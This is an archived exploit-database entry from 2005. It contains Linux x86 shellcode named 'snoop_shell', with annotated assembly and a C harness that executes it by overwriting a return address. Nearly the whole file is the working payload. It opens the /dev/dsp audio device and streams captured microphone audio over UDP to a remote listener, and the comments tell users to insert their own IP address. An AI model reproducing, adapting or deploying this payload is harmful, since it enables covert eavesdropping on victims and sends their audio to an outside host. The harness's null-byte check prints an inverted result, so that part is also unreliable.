/* Placed the listener here http://www.milw0rm.com/down.php?id=1293 /str0ke */

/********************************************************************
	hey folks, this is snoop_shell, short and simply it snoops on
	/dev/dsp and after attempting to lower the audio quality
	will stream any data read on this device over a udp stream
	to a remote listening client.. (source should be available at stonedcoder.org)

	the port that this will stream on is whatever the high half
	of the ip address is, i figured this will always be over 1024
	so the client will be usable without root privs.

	at 172 bytes, its really bloated for shellcode, but if your
	reading this anyway, you probably are just looking to have fun
	with it..

	remember you'll need to change the ip address before you
	actually use it.. and if your unlucky enough to have an
	ip address that contains a null.. well.. its on you to fix it..
	but you can do that by simply rotating the ipaddress by a bit or
	two..

	mov    $0xE8015180,%ebx						#192.168.0.116
	ror	   %ebx									#shift right by one bit

	no more null


	phar[at]stonedcoder[dot]org
*********************************************************************/


char shellcode[] =
"\x31\xc9"                	//xor    %ecx,%ecx
"\x51"	                   	//push   %ecx					# \x00
"\x68\x2f\x64\x73\x70"      //push   $0x7073642f			# /dsp
"\x68\x2f\x64\x65\x76"      //push   $0x7665642f			# /dev
"\x89\xe3"                	//mov    %esp,%ebx
"\x89\xc8"                	//mov    %ecx,%eax
"\xb1\x02"                	//mov    $0x2,%cl
"\xb0\x05"                	//mov    $0x5,%al
"\xcd\x80"                	//int    $0x80					#open /dev/dsp for reading

"\x89\xc6"                	//mov    %eax,%esi				#preserve fd in esi

"\x31\xc9"                	//xor    %ecx,%ecx
"\x51"                   	//push   %ecx
"\x31\xdb"                	//xor    %ebx,%ebx
"\xb3\x02"                	//mov    $0x2,%bl
"\x53"                   	//push   %ebx
"\x53"                   	//push   %ebx
"\x4b"                   	//dec    %ebx
"\x89\xe1"                	//mov    %esp,%ecx
"\x89\xd8"                	//mov    %ebx,%eax
"\xb0\x66"                	//mov    $0x66,%al
"\xcd\x80"                	//int    $0x80					#create a udp socket

"\x89\xc7"                	//mov    %eax,%edi				#preserve socket in edi

"\xc1\xc3\x04"             	//rol    $0x4,%ebx
"\x53"                   	//push   %ebx
"\x89\xe2"                	//mov    %esp,%edx
"\xb9\x05\x50\x04\xc0"      //mov    $0xc0045005,%ecx
"\x89\xf3"                	//mov    %esi,%ebx
"\xb0\x36"                	//mov    $0x36,%al
"\xcd\x80"                	//int    $0x80					#ioctl on fd SOUND_PCM_WRITE_BITS (16 bits per samle)

"\xfe\xc0"                	//inc    %al
"\x89\x04\x24"             	//mov    %eax,(%esp)
"\xfe\xc1"                	//inc    %cl
"\xb0\x36"                	//mov    $0x36,%al
"\xcd\x80"                	//int    $0x80					#ioctl on fd SOUND_PCM_WRITE_CHANNELS (1 channel)

"\xfe\xc0"                	//inc    %al
"\xc1\xc0\x0d"             	//rol    $0xd,%eax
"\x89\x04\x24"             	//mov    %eax,(%esp)
"\xc1\xc8\x04"             	//ror    $0x8,%eax
"\xb1\x02"                	//mov    $0x2,%cl
"\xb0\x36"                	//mov    $0x36,%al				#ioctl on fd SOUND_PCM_WRITE_RATE (8khz)
"\xcd\x80"                	//int    $0x80

"\x50"                   	//push   %eax
"\x50"                   	//push   %eax
"\x89\xc2"                	//mov    %eax,%edx

/* prepare an area on the stack that looks like an struct in_addr */
	  /*your ipv4 ip address*/
"\xbb" "\xc0\xa8\x0f\x2e"   //mov    $0x7401a8c0,%ebx		#your ipaddress would go here currently set to 192.168.1.116
"\x53"                   	//push   %ebx
"\xc1\xe3\x10"             	//shl    $0x10,%ebx
"\xb3\x02"                	//mov    $0x2,%bl
"\x53"                 		//push   %ebx					#port and family, (we'll use use the hi half of the address for a port)

/* allocate 1025 byte buffer on the stack */
"\x89\xe3"                	//mov    %esp,%ebx
"\x66\xba\x01\x04"          //mov    $0x401,%dx				#create the space on the stack (1025 bytes)
"\x29\xd4"                	//sub    %edx,%esp

"\x89\xe0"                	//mov    %esp,%eax
"\x31\xc9"                	//xor    %ecx,%ecx
"\xb1\x10"                	//mov    $0x10,%cl
"\x51"       	            //push   %ecx
"\x53"         	          	//push   %ebx
"\x31\xc9"         	       	//xor    %ecx,%ecx
"\x51"               	    //push   %ecx
"\x52"                 	  	//push   %edx
"\x50"                 	  	//push   %eax
"\x57"						//push   %edi
"\x89\xc2"                	//mov    %eax,%edx
"\x89\xcb"                	//mov    %ecx,%ebx
"\x89\xc8"                	//mov    %ecx,%eax
"\x89\xe1"                	//mov    %esp,%ecx
"\xb3\x0b"                	//mov    $0xb,%bl
"\xb0\x66"                	//mov    $0x66,%al
"\x51"                   	//push   %ecx
"\x89\xe7"                	//mov    %esp,%edi				#registers and stack are prepared for call to sendto
"\x60"                   	//pusha  						#push regs onto stack

"\x89\xf3"                	//mov    %esi,%ebx
"\x89\xd1"                	//mov    %edx,%ecx
"\x89\xd8"                	//mov    %ebx,%eax
"\xb0\x03"                	//mov    $0x3,%al
"\x89\xc2"                	//mov    %eax,%edx
"\x66\xba\x01\x08"          //mov    $0x401,%dx				#registers are prepared for call to read
"\x60"                   	//pusha  						#push regs


"\x89\x27"                	//mov    %esp,(%edi)			#store this stack pointer in the memory allocated above
/*loop:*/					//								#so that we can restore it for the loop

"\x61"                   	//popa   						#pop prepared registers from stack
"\xcd\x80"                	//int    $0x80					#call read

"\x61"                 	  	//popa   						#pop registers again
"\xcd\x80"                	//int    $0x80					#call sendto

"\x8b\x27"                	//mov    (%edi),%esp			#pulls from the memory allocated before and restores esp
"\xeb\xf6"                	//jmp    80483f5 <loop>
;



int main() {
int *ret;
char cnull = 0;

	printf("shellcode_size: %u\n", sizeof(shellcode));
	printf("contains nulls: ");
	if(!memmem(shellcode,sizeof(shellcode),&cnull,1)){
		printf("yes\n");
	}else{
		printf("no\n");
	}

	ret = (int *)&ret + 2;
	(*ret) = (int)shellcode;

}

// milw0rm.com [2005-11-04]